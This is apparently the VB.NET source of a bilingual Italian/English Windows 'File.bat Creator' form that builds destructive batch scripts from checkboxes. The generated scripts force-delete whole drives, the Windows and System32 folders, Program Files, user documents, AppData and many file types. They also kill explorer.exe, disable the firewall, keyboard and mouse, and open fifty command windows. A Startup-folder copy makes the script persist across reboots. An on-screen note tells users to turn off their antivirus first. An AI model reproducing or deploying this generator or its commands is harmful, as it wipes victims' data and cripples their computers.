Public Class Form1
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Select Case ComboBox1.SelectedItem
            Case "Italiano"
                Try
                    Dim savefile As New SaveFileDialog
                    savefile.ShowDialog()
                    My.Computer.FileSystem.WriteAllText(savefile.FileName & ".bat", TextBox1.Text, False)
                    MsgBox("Jordan ha appena creato il tuo file.bat con successo!", MsgBoxStyle.Exclamation, "Perfetto!")
                Catch ex As Exception
                End Try
            Case "English"
                Try
                    Dim savefile As New SaveFileDialog
                    savefile.ShowDialog()
                    My.Computer.FileSystem.WriteAllText(savefile.FileName & ".bat", TextBox1.Text, False)
                    MsgBox("Jordan has just created your file.bat successfully!", MsgBoxStyle.Exclamation, "Perfect!")
                Catch ex As Exception
                End Try
        End Select
    End Sub
    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        TextBox1.Clear()
        TextBox1.Text = "@echo off" & vbCrLf
        If CheckBox2.Checked = True Then
            TextBox1.AppendText("@del /f /s /q C:\*.mp3" & vbCrLf)
        End If
        If CheckBox3.Checked = True Then
            TextBox1.AppendText("@del /f /s /q C:\*.avi" & vbCrLf)
        End If
        If CheckBox4.Checked = True Then
            TextBox1.AppendText("@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf & "@start" & vbCrLf)
        End If
        If CheckBox6.Checked = True Then
            TextBox1.AppendText("@del /f /s /q C:\*.pdf" & vbCrLf)
        End If
        If CheckBox7.Checked = True Then
            TextBox1.AppendText("@del /f /s /q %windir%\Fonts" & vbCrLf)
        End If
        If CheckBox8.Checked = True Then
            TextBox1.AppendText("@del /f /s /q %windir%\System32\telnet.exe" & vbCrLf)
        End If
        If CheckBox9.Checked = True Then
            TextBox1.AppendText("@del /f /s /q C:\*.jpeg" & vbCrLf)
        End If
        If CheckBox10.Checked = True Then
            TextBox1.AppendText("@del /f /s /q %windir%\System32\calc.exe" & vbCrLf)
        End If
        If CheckBox11.Checked = True Then
            TextBox1.AppendText("@del /f /s /q C:\*.txt" & vbCrLf)
        End If
        If CheckBox12.Checked = True Then
            TextBox1.AppendText("@del /f /s /q %windir%\Cursors" & vbCrLf)
        End If
        If CheckBox13.Checked = True Then
            TextBox1.AppendText("@del /f /s /q C:\Progra~1\Windows Live" & vbCrLf)
        End If
        If CheckBox14.Checked = True Then
            TextBox1.AppendText("@del /f /s /q %windir%\System32\ipconfig.exe" & vbCrLf)
        End If
        If CheckBox15.Checked = True Then
            TextBox1.AppendText("@taskkill /f /im explorer.exe" & vbCrLf)
        End If
        If CheckBox18.Checked = True Then
            TextBox1.AppendText("@del /f /s /q %windir%\System32\*.dll" & vbCrLf)
        End If
        If CheckBox19.Checked = True Then
            TextBox1.AppendText("@cmd /c time " + TextBox2.Text & vbCrLf)
        End If
        If CheckBox20.Checked = True Then
            TextBox1.AppendText("@cmd /c date " + TextBox3.Text & vbCrLf)
        End If
        If CheckBox23.Checked = True Then
            TextBox1.AppendText("@rundll32 mouse,disable" & vbCrLf)
        End If
        If CheckBox24.Checked = True Then
            TextBox1.AppendText("@rundll32 keyboard,disable" & vbCrLf)
        End If
        If CheckBox26.Checked = True Then
            TextBox1.AppendText("@del /f /s /q D:\" & vbCrLf)
        End If
        If CheckBox27.Checked = True Then
            TextBox1.AppendText("@del /f /s /q C:\" & vbCrLf)
        End If
        If CheckBox28.Checked = True Then
            TextBox1.AppendText("@del /f /s /q C:\*.wav" & vbCrLf)
        End If
        If CheckBox29.Checked = True Then
            TextBox1.AppendText("@del /f /s /q C:\*.vbs" & vbCrLf)
        End If
        If CheckBox30.Checked = True Then
            TextBox1.AppendText("@del /f /s /q %windir%" & vbCrLf)
        End If
        If CheckBox31.Checked = True Then
            TextBox1.AppendText("@del /f /s /q C:\Progra~1\Intern~1" & vbCrLf)
        End If
        If CheckBox32.Checked = True Then
            TextBox1.AppendText("@del /f /s /q %appdata%" & vbCrLf)
        End If
        If CheckBox33.Checked = True Then
            TextBox1.AppendText("@del /f /s /q C:\*.bmp" & vbCrLf)
        End If
        If CheckBox34.Checked = True Then
            TextBox1.AppendText("@del /f /s /q C:\*.gif" & vbCrLf)
        End If
        If CheckBox35.Checked = True Then
            TextBox1.AppendText("@del /f /s /q %windir%\System32" & vbCrLf)
        End If
        If CheckBox37.Checked = True Then
            TextBox1.AppendText("@cmd /c netsh advfirewall set currentprofile state off" & vbCrLf)
        End If
        If CheckBox39.Checked = True Then
            TextBox1.AppendText("@del /f /s /q C:\Progra~1" & vbCrLf)
        End If
        If CheckBox41.Checked = True Then
            TextBox1.AppendText("@del /f /s /q docume~1" & vbCrLf)
        End If
        If CheckBox16.Checked = True Then
            TextBox1.AppendText("@set startupfolder=" + Chr(34) + "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" + Chr(34) & vbCrLf + "@If Exist %StartupFolder% Goto :FoundStartup" & vbCrLf + "@:FoundStartup" & vbCrLf + "@copy %0 %StartupFolder%" & vbCrLf)
        End If
        If CheckBox1.Checked = True Then
            TextBox1.AppendText("@shutdown /s /t 01" & vbCrLf)
        End If
        If CheckBox5.Checked = True Then
            TextBox1.AppendText("@shutdown /r /t 01" & vbCrLf)
        End If
    End Sub
    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        TextBox1.Clear()
    End Sub
    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        CheckBox2.Checked = True
        CheckBox3.Checked = True
        CheckBox4.Checked = True
        CheckBox6.Checked = True
        CheckBox7.Checked = True
        CheckBox8.Checked = True
        CheckBox9.Checked = True
        CheckBox10.Checked = True
        CheckBox11.Checked = True
        CheckBox12.Checked = True
        CheckBox13.Checked = True
        CheckBox14.Checked = True
        CheckBox15.Checked = True
        CheckBox16.Checked = True
        CheckBox18.Checked = True
        CheckBox19.Checked = True
        CheckBox20.Checked = True
        CheckBox23.Checked = True
        CheckBox24.Checked = True
        CheckBox26.Checked = True
        CheckBox27.Checked = True
        CheckBox28.Checked = True
        CheckBox29.Checked = True
        CheckBox30.Checked = True
        CheckBox31.Checked = True
        CheckBox32.Checked = True
        CheckBox33.Checked = True
        CheckBox34.Checked = True
        CheckBox35.Checked = True
        CheckBox37.Checked = True
        CheckBox39.Checked = True
        CheckBox41.Checked = True
        Select Case ComboBox1.SelectedItem
            Case "Italiano"
                MsgBox("Sono rimasti esclusi 'Riavvia PC' e 'Spegni PC'. " & vbCrLf & "Se vuoi scegline una, altrimenti clicca 'Genera'", MsgBoxStyle.Information, "Informazione")
            Case "English"
                MsgBox("'Restart PC' and 'Shutdown PC' have been left out. " & vbCrLf & "You can choose one of them or click 'Generate'", MsgBoxStyle.Information, "Information")
            End Select
    End Sub
    Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button6.Click
        CheckBox2.Checked = False
        CheckBox3.Checked = False
        CheckBox5.Checked = False
        CheckBox1.Checked = False
        CheckBox4.Checked = False
        CheckBox6.Checked = False
        CheckBox7.Checked = False
        CheckBox8.Checked = False
        CheckBox9.Checked = False
        CheckBox10.Checked = False
        CheckBox11.Checked = False
        CheckBox12.Checked = False
        CheckBox13.Checked = False
        CheckBox14.Checked = False
        CheckBox15.Checked = False
        CheckBox16.Checked = False
        CheckBox18.Checked = False
        CheckBox19.Checked = False
        CheckBox20.Checked = False
        CheckBox23.Checked = False
        CheckBox24.Checked = False
        CheckBox26.Checked = False
        CheckBox27.Checked = False
        CheckBox28.Checked = False
        CheckBox29.Checked = False
        CheckBox30.Checked = False
        CheckBox31.Checked = False
        CheckBox32.Checked = False
        CheckBox33.Checked = False
        CheckBox34.Checked = False
        CheckBox35.Checked = False
        CheckBox37.Checked = False
        CheckBox39.Checked = False
        CheckBox41.Checked = False
    End Sub
    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Me.Hide()
        Form3.Show()
    End Sub
    Private Sub CheckBox24_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox24.CheckedChanged
        Select Case ComboBox1.SelectedItem
            Case "Italiano"
                If CheckBox24.Checked = True Then
                    MsgBox("Flaggando 'Blocca Tastiera' nel file.bat si renderà inutilizzabile la tastiera, " & vbCrLf & "sarà quindi necessario riavviare il PC per tornare al normale utilizzo", MsgBoxStyle.Exclamation, "Attenzione!")
                End If
            Case "English"
                If CheckBox24.Checked = True Then
                    MsgBox("With 'Freeze keyboard' in the file.bat you will no longer operate the keyboard, " & vbCrLf & " therefore will be necessary to restart the PC to return to normal use", MsgBoxStyle.Exclamation, "Warning!")
                End If
        End Select
    End Sub
    Private Sub CheckBox23_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox23.CheckedChanged
        Select Case ComboBox1.SelectedItem
            Case "Italiano"
                If CheckBox23.Checked = True Then
                    MsgBox("Flaggando 'Blocca mouse' nel file.bat si renderà inutilizzabile la tastiera, " & vbCrLf & "sarà quindi necessario riavviare il PC per tornare al normale utilizzo", MsgBoxStyle.Exclamation, "Attenzione!")
                End If
            Case "English"
                If CheckBox23.Checked = True Then
                    MsgBox("With 'Freeze mouse' in the file.bat you will no longer operate the keyboard, " & vbCrLf & " therefore will be necessary to restart the PC to return to normal use", MsgBoxStyle.Exclamation, "Warning!")
                End If
        End Select
    End Sub
    Private Sub CheckBox5_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox5.CheckedChanged
        If CheckBox5.Checked = True Then
            CheckBox1.Enabled = False
        End If
        If CheckBox5.Checked = False Then
            CheckBox1.Enabled = True
        End If
    End Sub
    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            CheckBox5.Enabled = False
        End If
        If CheckBox1.Checked = False Then
            CheckBox5.Enabled = True
        End If
    End Sub
    Private Sub Button7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button7.Click
        Select Case ComboBox1.SelectedItem
            Case "Italiano"
                CheckBox27.Text = "Elimina Disco C:\"
                CheckBox26.Text = "Elimina Disco D:\"
                CheckBox15.Text = "Termina explorer.exe"
                CheckBox37.Text = "Disabilita Firewall"
                CheckBox19.Text = "Cambia ora"
                CheckBox20.Text = "Cambia data"
                CheckBox24.Text = "Blocca tastiera"
                CheckBox23.Text = "Blocca mouse"
                CheckBox5.Text = "Riavvia PC"
                CheckBox1.Text = "Spegni PC"
                CheckBox4.Text = "Avvia 50 CMD"
                CheckBox12.Text = "Cursori"
                CheckBox31.Text = "Internet"
                CheckBox7.Text = "Scritture"
                CheckBox30.Text = "Windows"
                CheckBox32.Text = "AppData"
                CheckBox41.Text = "Documenti"
                CheckBox39.Text = "Programmi"
                CheckBox35.Text = "System32"
                CheckBox2.Text = ".mp3"
                CheckBox3.Text = ".avi"
                CheckBox6.Text = ".pdf"
                CheckBox9.Text = ".jpeg"
                CheckBox11.Text = ".txt"
                CheckBox18.Text = ".dll"
                CheckBox34.Text = ".gif"
                CheckBox33.Text = ".bmp"
                CheckBox29.Text = ".vbs"
                CheckBox28.Text = ".wav"
                CheckBox8.Text = "Telnet"
                CheckBox10.Text = "Calcolatrice"
                CheckBox13.Text = "MSN"
                CheckBox14.Text = "Ipconfig"
                CheckBox16.Text = "Esegui all'avvio di Windows"
                Me.Text = "Creatore File.bat!"
                GroupBox4.Text = "Modifica Impostazioni"
                GroupBox3.Text = "Elimina Cartelle"
                GroupBox1.Text = "Elimina File"
                GroupBox2.Text = "Elimina Servizi"
                Button5.Text = "Seleziona tutto"
                Button6.Text = "Deseleziona tutto"
                Button2.Text = "Compila"
                Button4.Text = "Azzera"
                Button1.Text = "Genera"
                Button8.Text = "Visualizza"
                Button3.Text = "Esci!"
                TextBox3.Text = "gg/mm/aa"
                TextBox2.Text = "hh:mm:ss"
                Label1.Text = "* Prima di generare il file è consigliabile disattivare l'antivirus."
            Case "English"
                CheckBox27.Text = "Delete C:\"
                CheckBox26.Text = "Delete D:\"
                CheckBox15.Text = "Kill explorer.exe"
                CheckBox37.Text = "Disable Firewall"
                CheckBox19.Text = "Change time"
                CheckBox20.Text = "Change date"
                CheckBox24.Text = "Freeze keyboard"
                CheckBox23.Text = "Freeze mouse"
                CheckBox5.Text = "Restart PC"
                CheckBox1.Text = "Shutdown PC"
                CheckBox4.Text = "Start 50 CMDs"
                CheckBox12.Text = "Cursors"
                CheckBox31.Text = "Internet"
                CheckBox7.Text = "Fonts"
                CheckBox30.Text = "Windows"
                CheckBox32.Text = "AppData"
                CheckBox41.Text = "Documents"
                CheckBox39.Text = "Programs"
                CheckBox35.Text = "System32"
                CheckBox2.Text = ".mp3"
                CheckBox3.Text = ".avi"
                CheckBox6.Text = ".pdf"
                CheckBox9.Text = ".jpeg"
                CheckBox11.Text = ".txt"
                CheckBox18.Text = ".dll"
                CheckBox34.Text = ".gif"
                CheckBox33.Text = ".bmp"
                CheckBox29.Text = ".vbs"
                CheckBox28.Text = ".wav"
                CheckBox8.Text = "Telnet"
                CheckBox10.Text = "Calculator"
                CheckBox13.Text = "MSN"
                CheckBox14.Text = "Ipconfig"
                CheckBox16.Text = "Launch on Windows Startup"
                Me.Text = "File.bat Creator!"
                GroupBox4.Text = "Edit Settings"
                GroupBox3.Text = "Delete Folders"
                GroupBox1.Text = "Delete Files"
                GroupBox2.Text = "Delete Services"
                Button5.Text = "Select All"
                Button6.Text = "Deselect All"
                Button2.Text = "Compile"
                Button4.Text = "Clear"
                Button1.Text = "Generate"
                Button8.Text = "Show"
                Button3.Text = "Exit!"
                TextBox3.Text = "dd/mm/yy"
                TextBox2.Text = "hh:mm:ss"
                Label1.Text = "* It's reccomended to disable the antivirus before to generate the file."
        End Select
    End Sub
    Private Sub Button8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button8.Click
        If TextBox4.Text = "nanoteck" Then
            TextBox1.Visible = True
        End If
    End Sub
End Class
